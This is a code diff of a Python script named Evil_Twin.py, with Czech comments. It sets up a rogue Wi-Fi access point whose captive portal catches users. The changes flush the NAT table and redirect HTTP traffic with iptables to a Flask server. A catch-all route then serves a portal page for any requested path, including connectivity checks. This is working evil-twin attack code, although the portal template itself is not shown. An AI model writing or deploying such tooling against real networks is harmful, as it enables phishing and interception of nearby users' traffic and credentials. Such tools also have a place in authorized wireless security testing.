@@ -88,38 +88,34 @@ def starting_services():
 #100% works till here now we need to start the captive portal and make it work
 
 def setup_iptables():
+    print("Setting up iptables rules...")
+    # Cisteni predchozich pravidel nat tabulky
+    cmd(["iptables", "-t", "nat", "-F"], ignore_error=True)
+    
+    # OPRAVA: Smerujeme POUZE port 80 (HTTP). Port 443 nesmerujeme, aby Flask nedostaval binarni TLS data.
     cmd(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE,
          "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"])
-    cmd(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE,
-         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "80"])
-    
-base_dir = os.path.dirname(os.path.abspath(__file__))
 
+base_dir = os.path.dirname(os.path.abspath(__file__))
 app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))
-@app.route("/")
-def captive_portal():
+
+# OPRAVA: Pridana Catch-All routa, ktera odchyti jakoukoliv HTTP adresu (napr. /generate_204)
+@app.route("/", defaults={"path": ""})
+@app.route("/<path:path>")
+def captive_portal(path):
     return render_template("captive_portal.html")
 
-
 def start_portal():
+     print("Starting web server on port 80...")
      app.run(host="0.0.0.0", port=80, threaded=True)
 
 def main():
-    #Use ALL functions
     stoping_services()
     configuring_interfaces()
     starting_services()
     setup_iptables()
+    print("Starting Evil_Twin.py Portal")
     start_portal()
 
-
-main()
-
-
-
-
-
-
-
-
-
+if __name__ == "__main__":
+    main()
